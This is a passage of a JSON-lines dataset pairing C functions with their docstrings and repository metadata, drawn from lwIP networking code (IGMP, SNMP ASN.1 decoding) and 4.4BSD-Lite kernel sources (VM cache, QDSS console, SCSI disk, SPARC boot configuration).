IGMP_ADD_MAC_FILTER);\n          }\n\n          IGMP_STATS_INC(igmp.join_sent);\n          igmp_send(group, IGMP_V2_MEMB_REPORT);\n\n          igmp_start_timer(group, IGMP_JOIN_DELAYING_MEMBER_TMR);\n\n          /* Need to work out where this timer comes from */\n          group->group_state = IGMP_GROUP_DELAYING_MEMBER;\n        }\n        /* Increment group use */\n        group->use++;\n        /* Join on this interface */\n        err = ERR_OK;\n      } else {\n        /* Return an error even if some network interfaces are joined */\n        /** @todo undo any other netif already joined */\n        LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_joingroup: Not enought memory to join to group\\n\"));\n        return ERR_MEM;\n      }\n    }\n    /* proceed to next network interface */\n    netif = netif->next;\n  }\n\n  return err;\n}", "path": "net\\lwip\\core\\ipv4\\igmp.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Remove a group in the global igmp_group_list\n *\n * @param group the group to remove from the global igmp_group_list\n * @return ERR_OK if group was removed from the list, an err_t otherwise\n */\n", "func_signal": "err_t\nigmp_remove_group(struct igmp_group *group)", "code": "{\n  err_t err = ERR_OK;\n\n  /* Is it the first group? */\n  if (igmp_group_list == group) {\n    igmp_group_list = group->next;\n  } else {\n    /* look for group further down the list */\n    struct igmp_group *tmpGroup;\n    for (tmpGroup = igmp_group_list; tmpGroup != NULL; tmpGroup = tmpGroup->next) {\n      if (tmpGroup->next == group) {\n        tmpGroup->next = group->next;\n        break;\n      }\n    }\n    /* Group not found in the global igmp_group_list */\n    if (tmpGroup == NULL)\n      err = ERR_ARG;\n  }\n  /* free group */\n  memp_free(MEMP_IGMP_GROUP, group);\n\n  return err;\n}", "path": "net\\lwip\\core\\ipv4\\igmp.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Decodes object identifier from incoming message into array of s32_t.\n *\n * @param p points to a pbuf holding an ASN1 coded object identifier\n * @param ofs points to the offset within the pbuf chain of the ASN1 coded object identifier\n * @param len length of the coded object identifier\n * @param oid return object identifier struct\n * @return ERR_OK if successfull, ERR_ARG if we can't (or won't) decode\n */\n", "func_signal": "err_t\nsnmp_asn1_dec_oid(struct pbuf *p, u16_t ofs, u16_t len, struct snmp_obj_id *oid)", "code": "{\n  u16_t plen, base;\n  u8_t *msg_ptr;\n  s32_t *oid_ptr;\n\n  plen = 0;\n  while (p != NULL)\n  {\n    base = plen;\n    plen += p->len;\n    if (ofs < plen)\n    {\n      msg_ptr = p->payload;\n      msg_ptr += ofs - base;\n\n      oid->len = 0;\n      oid_ptr = &oid->id[0];\n      if (len > 0)\n      {\n        /* first compressed octet */\n        if (*msg_ptr == 0x2B)\n        {\n          /* (most) common case 1.3 (iso.org) */\n          *oid_ptr = 1;\n          oid_ptr++;\n          *oid_ptr = 3;\n          oid_ptr++;\n        }\n        else if (*msg_ptr < 40)\n        {\n          *oid_ptr = 0;\n          oid_ptr++;\n          *oid_ptr = *msg_ptr;\n          oid_ptr++;\n        }\n        else if (*msg_ptr < 80)\n        {\n          *oid_ptr = 1;\n          oid_ptr++;\n          *oid_ptr = (*msg_ptr) - 40;\n          oid_ptr++;\n        }\n        else\n        {\n          *oid_ptr = 2;\n          oid_ptr++;\n          *oid_ptr = (*msg_ptr) - 80;\n          oid_ptr++;\n        }\n        oid->len = 2;\n      }\n      else\n      {\n        /* accepting zero length identifiers e.g. for\n           getnext operation. uncommon but valid */\n        return ERR_OK;\n      }\n      len--;\n      if (len > 0)\n      {\n        ofs += 1;\n        if (ofs >= plen)\n        {\n          /* next octet in next pbuf */\n          p = p->next;\n          if (p == NULL) { return ERR_ARG; }\n          msg_ptr = p->payload;\n          plen += p->len;\n        }\n        else\n        {\n          /* next octet in same pbuf */\n          msg_ptr++;\n        }\n      }\n      while ((len > 0) && (oid->len < LWIP_SNMP_OBJ_ID_LEN))\n      {\n        /* sub-identifier uses multiple octets */\n        if (*msg_ptr & 0x80)\n        {\n          s32_t sub_id = 0;\n\n          while ((*msg_ptr & 0x80) && (len > 1))\n          {\n            len--;\n            sub_id = (sub_id << 7) + (*msg_ptr & ~0x80);\n            ofs += 1;\n            if (ofs >= plen)\n            {\n              /* next octet in next pbuf */\n              p = p->next;\n              if (p == NULL) { return ERR_ARG; }\n              msg_ptr = p->payload;\n              plen += p->len;\n            }\n            else\n            {\n              /* next octet in same pbuf */\n              msg_ptr++;\n            }\n          }\n          if (!(*msg_ptr & 0x80) && (len > 0))\n          {\n            /* last octet sub-identifier */\n            len--;\n            sub_id = (sub_id << 7) + *msg_ptr;\n            *oid_ptr = sub_id;\n          }\n        }\n        else\n        {\n          /* !(*msg_ptr & 0x80) sub-identifier uses single octet */\n          len--;\n          *oid_ptr = *msg_ptr;\n        }\n        if (len > 0)\n        {\n          /* remaining oid bytes available ... */\n          ofs += 1;\n          if (ofs >= plen)\n          {\n            /* next octet in next pbuf */\n            p = p->next;\n            if (p == NULL) { return ERR_ARG; }\n            msg_ptr = p->payload;\n            plen += p->len;\n          }\n          else\n          {\n            /* next octet in same pbuf */\n            msg_ptr++;\n          }\n        }\n        oid_ptr++;\n        oid->len++;\n      }\n      if (len == 0)\n      {\n        /* len == 0, end of oid */\n        return ERR_OK;\n      }\n      else\n      {\n        /* len > 0, oid->len == LWIP_SNMP_OBJ_ID_LEN or malformed encoding */\n        return ERR_ARG;\n      }\n\n    }\n    p = p->next;\n  }\n  /* p == NULL, ofs >= plen */\n  return ERR_ARG;\n}", "path": "net\\lwip\\core\\snmp\\asn1_dec.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Search for a specific igmp group and create a new one if not found-\n *\n * @param ifp the network interface for which to look\n * @param addr the group ip address to search\n * @return a struct igmp_group*,\n *         NULL on memory error.\n */\n", "func_signal": "struct igmp_group *\nigmp_lookup_group(struct netif *ifp, struct ip_addr *addr)", "code": "{\n  struct igmp_group *group = igmp_group_list;\n  \n  /* Search if the group already exists */\n  group = igmp_lookfor_group(ifp, addr);\n  if (group != NULL) {\n    /* Group already exists. */\n    return group;\n  }\n\n  /* Group doesn't exist yet, create a new one */\n  group = memp_malloc(MEMP_IGMP_GROUP);\n  if (group != NULL) {\n    group->interface          = ifp;\n    ip_addr_set(&(group->group_address), addr);\n    group->timer              = 0; /* Not running */\n    group->group_state        = IGMP_GROUP_NON_MEMBER;\n    group->last_reporter_flag = 0;\n    group->use                = 0;\n    group->next               = igmp_group_list;\n    \n    igmp_group_list = group;\n  }\n\n  LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_lookup_group: %sallocated a new group with address \", (group?\"\":\"impossible to \")));\n  ip_addr_debug_print(IGMP_DEBUG, addr);\n  LWIP_DEBUGF(IGMP_DEBUG, (\" on if %x\\n\", (int) ifp));\n\n  return group;\n}", "path": "net\\lwip\\core\\ipv4\\igmp.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/*\n *\tTrim the object cache to size.\n */\n", "func_signal": "void\nvm_object_cache_trim()", "code": "{\n\tregister vm_object_t\tobject;\n\n\tvm_object_cache_lock();\n\twhile (vm_object_cached > vm_cache_max) {\n\t\tobject = vm_object_cached_list.tqh_first;\n\t\tvm_object_cache_unlock();\n\n\t\tif (object != vm_object_lookup(object->pager))\n\t\t\tpanic(\"vm_object_deactivate: I'm sooo confused.\");\n\n\t\tpager_cache(object, FALSE);\n\n\t\tvm_object_cache_lock();\n\t}\n\tvm_object_cache_unlock();\n}", "path": "vm\\vm_object.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/*\n *  Get a character from the LK201 (polled)\n */\n", "func_signal": "qdgetc()", "code": "{\n\tregister short key;\n\tregister char chr;\n\tregister struct duart *duart;\n\n\tduart = (struct duart *) qdmap[0].duart;\n\n\t/*\n\t* Get a character from the keyboard. \n\t*/\nLOOP:\n\twhile (!(duart->statusA&RCV_RDY))\n\t\t;\n\n\tkey = duart->dataA;\n\tkey &= 0xFF;\n\n\t/*\n\t* Check for various keyboard errors  */\n\n\tif (key == LK_POWER_ERROR || key == LK_KDOWN_ERROR ||\n\t    key == LK_INPUT_ERROR || key == LK_OUTPUT_ERROR) {\n\t\tprintf(\"Keyboard error, code = %x\\n\", key);\n\t\treturn(0);\n\t}\n\n\tif (key < LK_LOWEST)\n\t\treturn(0);\n\n\t/*\n\t * See if its a state change key \n\t */\n\tswitch (key) {\n\n\tcase LOCK:\n\t\tq_keyboard.lock ^= 0xffff;\t/* toggle */\n\t\tif (q_keyboard.lock)\n\t\t\t(void)led_control(0, LK_LED_ENABLE, LK_LED_LOCK);\n\t\telse\n\t\t\t(void)led_control(0, LK_LED_DISABLE, LK_LED_LOCK);\n\t\tgoto LOOP;\n\n\tcase SHIFT:\n\t\tq_keyboard.shift ^= 0xFFFF;\n\t\tgoto LOOP;\n\n\tcase CNTRL:\n\t\tq_keyboard.cntrl ^= 0xFFFF;\n\t\tgoto LOOP;\n\n\tcase ALLUP:\n\t\tq_keyboard.cntrl = 0;\n\t\tq_keyboard.shift = 0;\n\t\tgoto LOOP;\n\n\tcase REPEAT:\n\t\tchr = q_keyboard.last;\n\t\tbreak;\n\n\t\t/*\n\t\t* Test for cntrl characters. If set, see if the character\n\t\t* is elligible to become a control character. \n\t\t*/\n\tdefault:\n\n\t\tif (q_keyboard.cntrl) {\n\t\t\tchr = q_key[key];\n\t\t\tif (chr >= ' ' && chr <= '~')\n\t\t\t    chr &= 0x1F;\n\t\t}\n\t\telse if ( q_keyboard.lock || q_keyboard.shift )\n\t\t    chr = q_shift_key[key];\n\t\telse\n\t\t\tchr = q_key[key];\n\t\tbreak;\n\t}\n\n\tif (chr < ' ' && chr > '~')\t/* if input is non-displayable */\n\t\treturn(0);\t\t/* ..then pitch it! */\n\n\tq_keyboard.last = chr;\n\n\t/*\n\t* Check for special function keys */\n\n\tif (chr & 0x80) \t\t/* pitch the function keys */\n\t\treturn(0);\n\telse\n\t\treturn(chr);\n\n}", "path": "vax\\uba\\qd.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/*\n *----------------------------------------------------------------------\n *\n * MemErrorInterrupts --\n *   pmax_errintr - for the DS2100/DS3100\n *   kn02_errintr - for the DS5000/200\n *   kn02ba_errintr - for the DS5000/1xx and DS5000/xx\n *\n *\tHandler an interrupt for the control register.\n *\n * Results:\n *\tNone.\n *\n * Side effects:\n *\tNone.\n *\n *----------------------------------------------------------------------\n */\n", "func_signal": "static void\npmax_errintr()", "code": "{\n\tvolatile u_short *sysCSRPtr =\n\t\t(u_short *)MACH_PHYS_TO_UNCACHED(KN01_SYS_CSR);\n\tu_short csr;\n\n\tcsr = *sysCSRPtr;\n\n\tif (csr & KN01_CSR_MERR) {\n\t\tprintf(\"Memory error at 0x%x\\n\",\n\t\t\t*(unsigned *)MACH_PHYS_TO_UNCACHED(KN01_SYS_ERRADR));\n\t\tpanic(\"Mem error interrupt\");\n\t}\n\t*sysCSRPtr = (csr & ~KN01_CSR_MBZ) | 0xff;\n}", "path": "pmax\\pmax\\trap.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/*\n * Attempt to find the device from which we were booted.\n * If we can do so, and not instructed not to do so,\n * change rootdev to correspond to the load device.\n */\n", "func_signal": "void\nsetroot()", "code": "{\n\tregister struct swdevt *swp;\n\tregister struct device *dv;\n\tregister int len, majdev, mindev, part;\n\tdev_t nrootdev, nswapdev;\n\tchar buf[128];\n#ifdef DOSWAP\n\tdev_t temp;\n#endif\n#ifdef NFS\n\textern int (*mountroot)(), nfs_mountroot();\n#endif\n\n\tif (boothowto & RB_ASKNAME) {\n\t\tfor (;;) {\n\t\t\tprintf(\"root device? \");\n\t\t\tlen = getstr(buf, sizeof(buf));\n#ifdef GENERIC\n\t\t\tif (len > 0 && buf[len - 1] == '*') {\n\t\t\t\tbuf[--len] = '\\0';\n\t\t\t\tdv = getdisk(buf, len, 1, &nrootdev);\n\t\t\t\tif (dv != NULL) {\n\t\t\t\t\tbootdv = dv;\n\t\t\t\t\tnswapdev = nrootdev;\n\t\t\t\t\tgoto gotswap;\n\t\t\t\t}\n\t\t\t}\n#endif\n\t\t\tdv = getdisk(buf, len, 0, &nrootdev);\n\t\t\tif (dv != NULL) {\n\t\t\t\tbootdv = dv;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tfor (;;) {\n\t\t\tprintf(\"swap device (default %sb)? \", bootdv->dv_xname);\n\t\t\tlen = getstr(buf, sizeof(buf));\n\t\t\tif (len == 0) {\n\t\t\t\tnswapdev = makedev(major(nrootdev),\n\t\t\t\t    (minor(nrootdev) & ~ PARTITIONMASK) | 1);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (getdisk(buf, len, 1, &nswapdev) != NULL)\n\t\t\t\tbreak;\n\t\t}\n#ifdef GENERIC\ngotswap:\n#endif\n\t\trootdev = nrootdev;\n\t\tswapdev = nswapdev;\n\t\tdumpdev = nswapdev;\t\t/* ??? */\n\t\tswdevt[0].sw_dev = nswapdev;\n\t\tswdevt[1].sw_dev = NODEV;\n\t\treturn;\n\t}\n\n\t/* XXX currently there's no way to set RB_DFLTROOT... */\n\tif (boothowto & RB_DFLTROOT || bootdv == NULL)\n\t\treturn;\n\n\tswitch (bootdv->dv_class) {\n\n#ifdef NFS\n\tcase DV_IFNET:\n\t\tmountroot = nfs_mountroot;\n\t\treturn;\n#endif\n\n#if defined(FFS) || defined(LFS)\n\tcase DV_DISK:\n\t\tmajdev = findblkmajor((struct dkdevice *)bootdv);\n\t\tif (majdev < 0)\n\t\t\treturn;\n\t\tpart = 0;\n\t\tmindev = (bootdv->dv_unit << PARTITIONSHIFT) + part;\n\t\tbreak;\n#endif\n\n\tdefault:\n\t\tprintf(\"can't figure root, hope your kernel is right\\n\");\n\t\treturn;\n\t}\n\n\t/*\n\t * Form a new rootdev\n\t */\n\tnrootdev = makedev(majdev, mindev);\n\t/*\n\t * If the original rootdev is the same as the one\n\t * just calculated, don't need to adjust the swap configuration.\n\t */\n\tif (rootdev == nrootdev)\n\t\treturn;\n\n\trootdev = nrootdev;\n\tprintf(\"Changing root device to %s%c\\n\", bootdv->dv_xname, part + 'a');\n\n#ifdef DOSWAP\n\tmindev &= ~PARTITIONMASK;\n\ttemp = NODEV;\n\tfor (swp = swdevt; swp->sw_dev != NODEV; swp++) {\n\t\tif (majdev == major(swp->sw_dev) &&\n\t\t    mindev == (minor(swp->sw_dev) & ~PARTITIONMASK)) {\n\t\t\ttemp = swdevt[0].sw_dev;\n\t\t\tswdevt[0].sw_dev = swp->sw_dev;\n\t\t\tswp->sw_dev = temp;\n\t\t\tbreak;\n\t\t}\n\t}\n\tif (swp->sw_dev == NODEV)\n\t\treturn;\n\n\t/*\n\t * If dumpdev was the same as the old primary swap device, move\n\t * it to the new primary swap device.\n\t */\n\tif (temp == dumpdev)\n\t\tdumpdev = swdevt[0].sw_dev;\n#endif\n}", "path": "sparc\\sparc\\autoconf.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/*\n * Init QDSS as console (before probe routine)\n */\n", "func_signal": "qdcons_init()", "code": "{\n\tregister unit;\n\tcaddr_t phys_adr;\t\t/* physical QDSS base adrs */\n\tu_int mapix;\t\t\t/* index into QVmap[] array */\n\tstruct percpu *pcpu;\t\t/* pointer to cpusw structure  */\n\tregister struct qbus *qb;\n\tu_short *qdaddr;\t\t/* address of QDSS IO page CSR */\n\tu_short *devptr;\t\t/* vitual device space */\n\textern cnputc();\n\n#define QDSSCSR 0x1F00\n\n\tif (v_putc != cnputc)\n\t    return 0;\n\n\tunit = 0;\n\n\t/*\n\t * find the cpusw entry that matches this machine. \n\t */\n\tfor (pcpu = percpu; pcpu && pcpu->pc_cputype != cpu; pcpu++)\n\t\t;\n\tif (pcpu == NULL)\n\t    return 0;\n\tif (pcpu->pc_io->io_type != IO_QBUS)\n\t    return 0;\n\n\t/*\n\t * Map device registers - the last 8K of qvmem.\n\t */\n\tqb = (struct qbus *)pcpu->pc_io->io_details;\n\tioaccess(qb->qb_iopage, UMEMmap[0] + qb->qb_memsize,\n\t\t UBAIOPAGES * NBPG);\n\tdevptr = (u_short *)((char *)umem[0]+(qb->qb_memsize * NBPG));\n\tqdaddr = (u_short *)((u_int)devptr + ubdevreg(QDSSCSR));\n\tif (badaddr((caddr_t)qdaddr, sizeof(short)))\n\t\treturn 0;\n\n\t/*\n\t * Map q-bus memory used by qdss. (separate map)\n\t */\n\tmapix = QMEMSIZE - (CHUNK * (unit + 1));\n\tphys_adr = qb->qb_maddr + mapix;\n\tioaccess(phys_adr, QVmap[0], (CHUNK*NQD));\n\n\t/*\n\t * tell QDSS which Q memory address base to decode \n\t * (shifted right 16 bits - its in 64K units)\n\t */\n\t*qdaddr = (u_short)((int)mapix >> 16);\n\tqdflags[unit].config = *(u_short *)qdaddr;\n\n\t/*\n\t * load qdmap struct with the virtual addresses of the QDSS elements \n\t */\n\tqdbase[unit] = (caddr_t) (qvmem[0]);\n\tqdmap[unit].template = qdbase[unit] + TMPSTART;\n\tqdmap[unit].adder = qdbase[unit] + ADDER;\n\tqdmap[unit].dga = qdbase[unit] + DGA;\n\tqdmap[unit].duart = qdbase[unit] + DUART;\n\tqdmap[unit].memcsr = qdbase[unit] + MEMCSR;\n\tqdmap[unit].red = qdbase[unit] + RED;\n\tqdmap[unit].blue = qdbase[unit] + BLUE;\n\tqdmap[unit].green = qdbase[unit] + GREEN;\n\n\tqdflags[unit].duart_imask = 0;\t/* init shadow variables */\n\n\t/*\n\t * init the QDSS  \n\t */\n\t/* \n\tprintf(\"qdbase[0] = %x, qdmap[0].memcsr = %x\\n\",\n\t\t(char *)qdbase[0], qdmap[0].memcsr);\n\t*/\n\n\t*(short *)qdmap[unit].memcsr |= SYNC_ON; /* once only: turn on sync */\n\n\tcursor[unit].x = 0;\n\tcursor[unit].y = 0;\n\tinit_shared(unit);\t\t/* init shared memory */\n\tsetup_dragon(unit);\t\t/* init the ADDER/VIPER stuff */\n\tclear_qd_screen(unit);\t\t/* clear the screen */\n\tldfont(unit);\t\t\t/* load the console font */\n\tldcursor(unit, cons_cursor);\t/* load default cursor map */\n\tsetup_input(unit);\t\t/* init the DUART */\n\tv_putc = qdputc;\t\t/* kernel console output to qdss */\n#ifdef KADB\n\tv_getc = qdgetc;\t\t/* kernel console input from qdss */\n\tv_poll = qdpoll;\t\t/* kdb hook to disable char intr */\n#endif\n\tconsops = &cdevsw[QDSSMAJOR];\t/* virtual console is qdss */\n\treturn 1;\n\n}", "path": "vax\\uba\\qd.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/*\n * Copy from from to to.  Intended for use in system installation.\n */\n", "func_signal": "main()", "code": "{\n\textern int errno;\n\tregister int from, to, record, rcc, wcc, bsize = BSIZE;\n\tchar buf[BSIZE];\n\n\tfrom = getfile(\"From\", 0);\n\tto = getfile(\"To\", 1);\n\tfor (record = 0;; ++record) {\n\t\tif (!(rcc = read(from, buf, bsize)))\n\t\t\tbreak;\n\t\tif (rcc < 0) {\n\t\t\tprintf(\"Record %d: read error, errno=%d\\n\",\n\t\t\t    record, errno);\n\t\t\tbreak;\n\t\t}\n\t\tif (rcc != bsize) {\n\t\t\tif (record == 0) {\n\t\t\t\tbsize = rcc;\n\t\t\t\tprintf(\"Block size set from input; %d bytes\\n\",\n\t\t\t\t    bsize);\n\t\t\t} else\n\t\t\t\tprintf(\"Record %d: read short; expected %d, got %d\\n\",\n\t\t\t\t    record, bsize, rcc);\n\t\t}\n#ifdef vax\n\t\t/* For bug in ht driver. */\n\t\tif (rcc > bsize)\n\t\t\trcc = bsize;\n#endif\n\t\tif ((wcc = write(to, buf, rcc)) < 0) {\n\t\t\tprintf(\"Record %d: write error: errno=%d\\n\",\n\t\t\t    record, errno);\n\t\t\tbreak;\n\t\t}\n\t\tif (wcc < rcc) {\n\t\t\tprintf(\"Record %d: write short; expected %d, got %d\\n\",\n\t\t\t    record, rcc, wcc);\n\t\t\tbreak;\n\t\t}\n\t}\n\tprintf(\"copy completed: %d records copied\\n\", record);\n}", "path": "stand\\copy.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/*\n * Determine mass storage and memory configuration for a machine.\n * We get the PROM's root device and make sure we understand it, then\n * attach it as `mainbus0'.  We also set up to handle the PROM `sync'\n * command.\n */\n", "func_signal": "configure()", "code": "{\n\tregister int node;\n\tregister char *cp;\n\tstruct romaux ra;\n\tvoid sync_crash();\n\n\tnode = findroot();\n\tcp = getpropstring(node, \"device_type\");\n\tif (strcmp(cp, \"cpu\") != 0) {\n\t\tprintf(\"PROM root device type = %s\\n\", cp);\n\t\tpanic(\"need CPU as root\");\n\t}\n\t*promvec->pv_synchook = sync_crash;\n\tra.ra_node = node;\n\tra.ra_name = cp = \"mainbus\";\n\tif (!config_rootfound(cp, (void *)&ra))\n\t\tpanic(\"mainbus not configured\");\n\t(void)spl0();\n\tif (bootdv)\n\t\tprintf(\"Found boot device %s\\n\", bootdv->dv_xname);\n\tcold = 0;\n\tsetroot();\n\tswapconf();\n\tdumpconf();\n}", "path": "sparc\\sparc\\autoconf.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/* Set the time of day clock, called via. stime system call.. */\n", "func_signal": "ka630_clkwrite()", "code": "{\n\tregister struct ka630clock *claddr = &ka630clock;\n\tstruct chiptime c;\n\tint s;\n\n\ttimetochip(&c);\n\ts = splhigh();\n\tcladdr->csr1 = KA630CLK_SET;\n\twhile ((claddr->csr0 & KA630CLK_UIP) != 0)\n\t\t;\n\tcladdr->sec = c.sec;\n\tcladdr->min = c.min;\n\tcladdr->hr = c.hour;\n\tcladdr->day = c.day;\n\tcladdr->mon = c.mon;\n\tcladdr->yr = c.year;\n#ifndef lint\n\t{ int t = claddr->csr2; }\t/* ??? */\n\t{ int t = claddr->csr3; }\t/* ??? */\n#endif\n\tcladdr->csr0 = KA630CLK_RATE;\n\tcladdr->csr1 = KA630CLK_ENABLE;\n\tsplx(s);\n}", "path": "vax\\vax\\ka630.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/* dev_t is short, must use prototype syntax */\n", "func_signal": "int\nsdopen(dev_t dev, int flags, int ifmt, struct proc *p)", "code": "{\n\tregister int unit = sdunit(dev);\n\tregister struct sd_softc *sc;\n\n\tif (unit >= sdcd.cd_ndevs || (sc = sdcd.cd_devs[unit]) == NULL)\n\t\treturn (ENXIO);\n\tif ((sc->sc_flags & SDF_ALIVE) == 0 && suser(p->p_ucred, &p->p_acflag))\n\t\treturn (ENXIO);\n\treturn (0);\n}", "path": "dev\\scsi\\sd.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/*\n * Part of the parameter list is set up by locore.s.\n * First 2 dummy variables MUST BE the first local\n * variables; leaving place for registers 0 and 1\n * which are not preserved by the current C compiler.\n * Then, the array of structures and the last_operand\n * HAVE to be in the given order, to correspond to the\n * description of process_info in 'alignment.h'. \n */\n", "func_signal": "alignment()", "code": "{\n\tlong\tspace_4_Register_1;\t/* register 1 */\n\tlong\tspace_4_Register_0;\t/* register 0 */\n\tstruct\toprnd\tspace_4_decoded[4];\n\tlong\tspace_4_opcode;\n\tlong\tspace_4_last_operand;\t/* Last operand # processed */\n\tlong\tspace_4_saved_pc;\n\tlong\tspace_4_saved_sp;\n\n\tregister process_info *infop;\n\n\tinfop = (process_info *)&space_4_saved_sp;\n\tsaved_pc = pc;\n\tsaved_sp = sp;\t     \t\t\t/* For possible exceptions */\n\n\tlast_operand = -1;   /* To get the operand routine going correctly */\n\n\topCODE = 0xff & *(char *)pc;\n\tpc++;\n\t(*Table[opCODE].routine) (infop);\t/* Call relevant handler */\n\t/*\n\t * NOTE: nothing should follow, except the return.\n\t * The register variables cannot be trusted anymore,\n\t * if an exception is signalled.  See 'exception.c'\n\t * to understand why.\n\t */\n}", "path": "tahoe\\align\\align.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/*\n *\tvm_object_cache_clear removes all objects from the cache.\n *\n */\n", "func_signal": "void vm_object_cache_clear()", "code": "{\n\tregister vm_object_t\tobject;\n\n\t/*\n\t *\tRemove each object in the cache by scanning down the\n\t *\tlist of cached objects.\n\t */\n\tvm_object_cache_lock();\n\twhile ((object = vm_object_cached_list.tqh_first) != NULL) {\n\t\tvm_object_cache_unlock();\n\n\t\t/* \n\t\t * Note: it is important that we use vm_object_lookup\n\t\t * to gain a reference, and not vm_object_reference, because\n\t\t * the logic for removing an object from the cache lies in \n\t\t * lookup.\n\t\t */\n\t\tif (object != vm_object_lookup(object->pager))\n\t\t\tpanic(\"vm_object_cache_clear: I'm sooo confused.\");\n\t\tpager_cache(object, FALSE);\n\n\t\tvm_object_cache_lock();\n\t}\n\tvm_object_cache_unlock();\n}", "path": "vm\\vm_object.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/*\n * Write `len' bytes from address `addr' to drive and partition in `dev',\n * at block blkoff from the beginning of the partition.  The address is\n * either kernel virtual or physical (some machines may never use one or\n * the other, but we need it in the protocol to stay machine-independent).\n */\n", "func_signal": "int\nsddump(dev_t dev, daddr_t blkoff, caddr_t addr, int len)", "code": "{\n\tregister struct sd_softc *sc;\n\tregister struct partition *p;\n\tregister daddr_t bn, n, nblks;\n\tregister struct hba_softc *hba;\n\tregister int stat, unit;\n\tstruct scsi_cdb cdb;\n\n\t/* drive ok? */\n\tunit = sdunit(dev);\n\tif (unit >= sdcd.cd_ndevs || (sc = sdcd.cd_devs[unit]) == NULL ||\n\t    (sc->sc_flags & SDF_ALIVE) == 0)\n\t\treturn (ENXIO);\n\n\t/* blocks in range? */\n\tp = &sc->sc_dk.dk_label.d_partitions[sdpart(dev)];\n\tn = (len + sc->sc_blksize - 1) >> DEV_BSHIFT;\n\tif (blkoff < 0 || blkoff >= p->p_size || blkoff + n > p->p_size)\n\t\treturn (EINVAL);\n\tbn = blkoff + p->p_offset;\n\tbn >>= sc->sc_bshift;\n\n\t/* scsi bus idle? */\n\thba = sc->sc_unit.u_hba;\n\tif (hba->hba_head) {\n\t\t(*hba->hba_driver->hd_reset)(hba, 0);\n\t\tprintf(\"[reset %s] \", sc->sc_dk.dk_dev.dv_xname);\n\t}\n\n\tCDB10(&cdb)->cdb_cmd = CMD_WRITE10;\n\tCDB10(&cdb)->cdb_lun_rel = sc->sc_unit.u_unit << 5;\n\tCDB10(&cdb)->cdb_xxx = 0;\n\tCDB10(&cdb)->cdb_ctrl = 0;\n\n#define\tDUMP_MAX\t(32 * 1024)\t/* no more than 32k per write */\n\tfor (;;) {\n\t\tif ((n = len) > DUMP_MAX)\n\t\t\tn = DUMP_MAX;\n\t\tCDB10(&cdb)->cdb_lbah = bn >> 24;\n\t\tCDB10(&cdb)->cdb_lbahm = bn >> 16;\n\t\tCDB10(&cdb)->cdb_lbalm = bn >> 8;\n\t\tCDB10(&cdb)->cdb_lbal = bn;\n\t\tnblks = n >> (DEV_BSHIFT + sc->sc_bshift);\n\t\tCDB10(&cdb)->cdb_lenh = nblks >> 8;\n\t\tCDB10(&cdb)->cdb_lenl = nblks;\n\t\tstat = hba->hba_driver->hd_dump(hba, sc->sc_unit.u_targ,\n\t\t    &cdb, addr, n);\n\t\tif ((stat & STS_MASK) != STS_GOOD) {\n\t\t\tprintf(\"%s: scsi write error 0x%x\\ndump \",\n\t\t\t    sc->sc_dk.dk_dev.dv_xname, stat);\n\t\t\treturn (EIO);\n\t\t}\n\t\tif ((len -= n) == 0)\n\t\t\treturn (0);\n\t\taddr += n;\n\t\tbn += nblks;\n\t}\n}", "path": "dev\\scsi\\sd.c", "repo_name": "neilss/4.4BSD-Lite", "stars": 45, "license": "None", "language": "c", "size": 5392}
{"docstring": "/*\n * locore.s code calls bootstrap() just before calling main(), after double\n * mapping the kernel to high memory and setting up the trap base register.\n * We must finish mapping the kernel properly and glean any bootstrap info.\n */\n", "func_signal": "void\nbootstrap()", "code": "{\n\tregister char *cp, *pp;\n\tregister struct bootpath *bp;\n\tint v0val[3];\n\tint nmmu, ncontext, node;\n#ifdef KGDB\n\textern int kgdb_debug_panic;\n#endif\n\n\tnode = findroot();\n\tnmmu = getpropint(node, \"mmu-npmg\", 128);\n\tncontext = getpropint(node, \"mmu-nctx\", 8);\n\tpmap_bootstrap(nmmu, ncontext);\n#ifdef KGDB\n\tzs_kgdb_init();\t\t\t/* XXX */\n#endif\n\t/*\n\t * On SS1s, promvec->pv_v0bootargs->ba_argv[1] contains the flags\n\t * that were given after the boot command.  On SS2s, pv_v0bootargs\n\t * is NULL but *promvec->pv_v2bootargs.v2_bootargs points to\n\t * \"vmunix -s\" or whatever.\n\t * ###\tDO THIS BEFORE pmap_boostrap?\n\t */\n\tbp = bootpath;\n\tif (promvec->pv_romvec_vers < 2) {\n\t\t/* Grab boot device name and values. */\n\t\tcp = (*promvec->pv_v0bootargs)->ba_argv[0];\n\t\tif (cp != NULL) {\n\t\t\t/* Kludge something up */\n\t\t\tpp = cp + 2;\n\t\t\tv0val[0] = v0val[1] = v0val[2] = 0;\n\t\t\tif (*pp == '(' &&\n\t\t\t    *(pp = 